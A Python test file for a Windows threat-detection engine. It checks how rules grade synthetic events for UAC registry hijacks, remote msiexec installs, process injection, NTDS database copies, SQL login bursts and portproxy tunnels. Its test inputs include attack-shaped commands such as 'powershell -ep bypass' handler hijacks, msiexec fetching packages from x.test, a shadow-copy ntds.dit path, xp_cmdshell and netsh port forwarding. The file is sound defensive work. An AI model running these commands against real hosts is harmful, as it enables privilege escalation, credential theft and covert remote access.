"""Passive native telemetry regressions for the W4 second review."""
import pytest

from romulus.detect.windows_catalog_events import NtdsDatabaseCopy
from romulus.detect.windows_elevation_events import UacRegistryHijack
from romulus.detect.windows_injection_w4 import InjectionShapedProcessAccess
from romulus.detect.windows_process_w4 import ServerOrBootProcessChild
from romulus.detect.windows_proxy import MsiexecRemotePackage
from romulus.detect.windows_tunnels_w4 import PortproxyConfiguration
from romulus.evidence.windows_catalog import lookup_event_class
from tests.test_windows_catalog_rules_w4 import native as catalog
from tests.test_windows_catalog_state_w4 import sql
from tests.test_windows_catalog_state_w4 import sweep_run as state_sweep
from tests.test_windows_elevation_w4 import native as elevation
from tests.test_windows_process_w4 import native, process, sweep_run
from tests.windows_process_support import run, sysmon1


@pytest.mark.parametrize('registered,payload', [
    ('chrome.exe', r'C:\Users\u\AppData\Local\Google\Chrome\Application\chrome.exe'),
    ('Teams.exe', r'C:\Users\u\AppData\Local\Microsoft\Teams\current\Teams.exe'),
    ('Code.exe', r'C:\Users\u\AppData\Local\Programs\Microsoft VS Code\Code.exe'),
])
def test_r2_app_paths_per_user_installs_are_leads(registered, payload):
    owner = UacRegistryHijack()
    try:
        event, _ = elevation(13, {'TargetObject': 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\' + registered + '\\(Default)', 'Details': payload})
        [match] = run(owner, [event])
        assert match.proposed_lane == 'lead'
    finally:
        owner.release_state()


def test_r2_folder_writable_file_manager_is_lead():
    owner = UacRegistryHijack()
    try:
        [match] = run(owner, [elevation(13, {'TargetObject': r'HKCU\Software\Classes\Folder\shell\open\command\(Default)', 'Details': r'C:\Users\u\manager.exe'})[0]])
        assert match.proposed_lane == 'lead'
    finally:
        owner.release_state()


@pytest.mark.parametrize('registered,payload', [('control.exe', r'C:\Users\u\payload.exe'), ('example.exe', 'powershell -ep bypass'), ('example.exe', 'cmd /c start fixture')])
def test_r2_app_paths_system_name_or_extensionless_code_runner_is_high(registered, payload):
    owner = UacRegistryHijack()
    try:
        event, _ = elevation(13, {'TargetObject': 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\' + registered + '\\(Default)', 'Details': payload})
        [match] = run(owner, [event])
        assert match.proposed_lane == 'high'
    finally:
        owner.release_state()


@pytest.mark.parametrize('key', ['ms-settings', 'mscfile', 'Launcher.SystemSettings'])
@pytest.mark.parametrize('payload', [r'cmd /c start C:\x.exe', 'powershell -ep bypass', r'C:\Tools\evil.exe', r'C:\PROGRA~3\x.exe'])
def test_r2_sensitive_class_nonempty_commands_are_high(key, payload):
    owner = UacRegistryHijack()
    try:
        [match] = run(owner, [elevation(13, {'TargetObject': 'HKCU\\Software\\Classes\\' + key + '\\shell\\open\\command\\(Default)', 'Details': payload})[0]])
        assert match.proposed_lane == 'high'
    finally:
        owner.release_state()


@pytest.mark.parametrize('command', ['msiexec.exe \u2013i http://x.test/a.msi', 'msiexec.exe /i:http://x.test/a.msi', 'msiexec.exe /i=http://x.test/a.msi', 'msiexec.exe /i x.msi TRANSFORMS=http://x.test/t.mst', r'msiexec.exe /i \\server\share\x.msi'])
def test_r2_msiexec_unbound_and_unc_requests_are_leads(command):
    owner = MsiexecRemotePackage()
    try:
        [match] = run(owner, [sysmon1(image=r'C:\Windows\System32\msiexec.exe', command=command)])
        assert match.proposed_lane == 'lead'
    finally:
        owner.release_state()


@pytest.mark.parametrize('integrity', ['High', 'System'])
def test_r2_server_compilation_inherited_integrity_is_lead(tmp_path, monkeypatch, integrity):
    record = native(process(r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe', r'NT AUTHORITY\SYSTEM', 2, ParentImage=r'C:\Windows\System32\inetsrv\w3wp.exe', IntegrityLevel=integrity))
    [finding], _ = sweep_run(tmp_path, monkeypatch, ServerOrBootProcessChild(), [[record]])
    assert finding['lane'] == 'lead'


def test_r2_writable_server_child_with_system_integrity_stays_high(tmp_path, monkeypatch):
    child = native(process(r'C:\Users\alice\Downloads\cmd.exe', r'NT AUTHORITY\SYSTEM', 2, ParentImage=r'C:\Windows\System32\inetsrv\w3wp.exe', IntegrityLevel='System'))
    [finding], _ = sweep_run(tmp_path, monkeypatch, ServerOrBootProcessChild(), [[child]])
    assert finding['lane'] == 'high' and 'writable' in finding['claim']


def test_r2_installer_service_start_is_quiet():
    owner = ServerOrBootProcessChild()
    try:
        event, _ = native(process(r'C:\Windows\System32\msiexec.exe', r'NT AUTHORITY\SYSTEM', 2, ParentImage=r'C:\Windows\System32\services.exe', CommandLine=r'C:\Windows\System32\msiexec.exe /V', IntegrityLevel='System'))
        assert run(owner, [event]) == []
    finally:
        owner.release_state()


@pytest.mark.parametrize('parent_integrity,child_integrity,lane', [('Medium', 'High', 'high'), ('System', 'High', 'lead'), ('High', 'High', 'lead')])
def test_r2_integrity_raise_needs_guid_joined_lower_parent(tmp_path, monkeypatch, parent_integrity, child_integrity, lane):
    parent = native(process(r'C:\Windows\System32\inetsrv\w3wp.exe', r'EXAMPLE\alice', 1, ProcessId='100', IntegrityLevel=parent_integrity))
    child = native(process(r'C:\Windows\System32\cmd.exe', r'EXAMPLE\alice', 2, ParentProcessGuid=parent[0].get('process.guid'), ParentImage=r'C:\Windows\System32\inetsrv\w3wp.exe', ParentProcessId='100', ProcessId='200', IntegrityLevel=child_integrity), n=2, offset=1)
    [finding], _ = sweep_run(tmp_path, monkeypatch, ServerOrBootProcessChild(), [[parent], [child]], assert_raw=(child,))
    assert finding['lane'] == lane


@pytest.mark.parametrize('source,target,trace,lane', [
    (r'C:\Program Files\Example\agent.exe', r'C:\Windows\System32\notepad.exe', r'C:\Windows\System32\ntdll.dll+1|C:\Windows\System32\KERNELBASE.dll+2|UNKNOWN(123)', 'lead'),
    (r'C:\Windows\System32\services.exe', r'C:\Windows\System32\svchost.exe', r'C:\Windows\System32\ntdll.dll+1|UNKNOWN(123)', 'lead'),
    (r'C:\Program Files\Example\agent.exe', r'C:\Windows\System32\notepad.exe', 'UNKNOWN(123)|UNKNOWN(456)', 'high'),
])
def test_r2_raw_unknown_trace_frames(source, target, trace, lane):
    owner = InjectionShapedProcessAccess()
    try:
        event, _ = native({'SourceImage': source, 'TargetImage': target, 'GrantedAccess': '0x2a', 'CallTrace': trace}, code=10)
        [match] = run(owner, [event])
        assert match.proposed_lane == lane
        assert any(field.field == 'process.access.call_trace' for field in match.predicate)
    finally:
        owner.release_state()


@pytest.mark.parametrize('path,lane', [(r'C:\Windows\NTDS\ntds.dit', 'lead'), (r'\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit', 'high')])
def test_r2_ntds_attach_live_and_shadow_paths(path, lane):
    owner = NtdsDatabaseCopy()
    try:
        [match] = run(owner, [catalog('ESENT', 326, {'param1': 'NTDS', 'param2': '123', 'param5': path})])
        assert match.proposed_lane == lane
    finally:
        owner.release_state()


@pytest.mark.parametrize('accounts,lane', [(['client'] * 12, 'lead'), (['client', 'other', 'third'] * 4, 'high'), (['sa'] * 12, 'high'), (['admin'] * 12, 'lead')])
def test_r2_sql_burst_requires_breadth_or_sa(tmp_path, monkeypatch, accounts, lane):
    [finding], _ = state_sweep(tmp_path, monkeypatch, 'MssqlLoginBruteforce', [[sql(n, account=account) for n, account in enumerate(accounts)]])
    assert finding['lane'] == lane


def test_r2_named_sql_audit_security_is_normalized():
    event = catalog('MSSQL$INSTANCE$AUDIT', 33205, {'param1': 'action_id:EX\nsucceeded:true\nobject_name:xp_cmdshell\nstatement:EXEC xp_cmdshell test'}, channel='Security')
    assert event is not None and event.family == 'database_audit'
    assert event.get('db.audit.object_name') == 'xp_cmdshell'
    assert lookup_event_class('Security', 'MSSQL$INSTANCE$AUDIT', 18456) is None
    assert lookup_event_class('Security', 'MSSQL$INSTANCE', 33205) is None


@pytest.mark.parametrize('command', ['netsh.exe interface portproxy add v4tov4 3389 192.0.2.10', 'netsh.exe -c interface portproxy add v4tov4 3389 192.0.2.10'])
def test_r2_portproxy_default_connectport_and_context(command):
    owner = PortproxyConfiguration()
    try:
        [match] = run(owner, [sysmon1(image=r'C:\Windows\System32\netsh.exe', command=command)])
        assert match.proposed_lane == 'high'
    finally:
        owner.release_state()


@pytest.mark.parametrize('listener,target,lane', [('HOST/3389', 'server.example.test/3389', 'high'), ('bad/value', 'unparsed', 'lead')])
def test_r2_portproxy_registry_hostnames_and_unparsed_values(listener, target, lane):
    owner = PortproxyConfiguration()
    try:
        [match] = run(owner, [elevation(13, {'TargetObject': 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\\' + listener, 'Details': target})[0]])
        assert match.proposed_lane == lane
    finally:
        owner.release_state()
